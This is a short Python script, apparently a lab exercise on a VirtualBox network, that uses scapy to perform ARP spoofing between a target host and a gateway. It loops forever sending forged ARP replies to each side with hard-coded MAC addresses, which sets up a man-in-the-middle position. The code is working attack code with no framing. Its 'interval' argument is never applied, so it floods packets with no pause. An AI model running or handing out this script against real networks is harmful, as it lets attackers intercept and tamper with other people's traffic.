from scapy.all import ARP, sendp, srp, Ether, send
import time

def send_arp_replies(target_ip, gateway_ip, iface=None, interval=1):
    
    try:

        while True:
            # Craft ARP reply packet
            arp_reply1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
            arp_reply2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
            
            # Craft Ethernet frame
            ether_frame1 = Ether(dst="08:00:27:25:f9:4d")
            ether_frame2 = Ether(dst="08:00:27:aa:76:db")

            # Combine Ethernet frames and ARP replys to make packets for each tảrget
            packet1 = ether_frame1 / arp_reply1
            packet2 = ether_frame2 / arp_reply2

            # Send packets, binding to the specified interface
            sendp(packet1, iface=iface, verbose=False)
            sendp(packet2, iface=iface, verbose=False)
            print("ARP reply sent successfully!")
            
    except Exception as e:
        print(f"Error: {e}")

# Example usage
target_ip = "192.168.56.101"  # Specify the target IP address
gateway_ip = "192.168.56.102"    # Specify the gateway IP address
send_arp_replies(target_ip, gateway_ip, iface="Ethernet 3", interval=1)  # Send ARP replies every 1 second
